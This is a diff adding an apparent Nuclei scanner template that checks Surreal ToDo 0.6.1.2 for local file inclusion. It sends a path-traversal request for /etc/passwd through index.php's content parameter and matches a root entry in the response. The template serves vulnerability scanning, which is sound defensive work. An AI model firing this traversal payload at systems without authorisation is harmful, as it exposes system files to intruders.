@@ -1,0 +1,31 @@
+http:
+- matchers:
+  - regex:
+    - root:[x*]:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/index.php?content=../../../../../../../../etc/passwd'
+id: surrealtodo-lfi
+info:
+  author: arafatansari
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  description: 'Surreal ToDo 0.6.1.2 is vulnerable to local file inclusion via index.php
+    and the content parameter.
+
+    '
+  metadata:
+    max-request: 1
+    verified: true
+  name: Surreal ToDo 0.6.1.2 - Local File Inclusion
+  reference:
+  - https://www.exploit-db.com/exploits/45826
+  severity: high
+  tags: surreal,lfi,edb
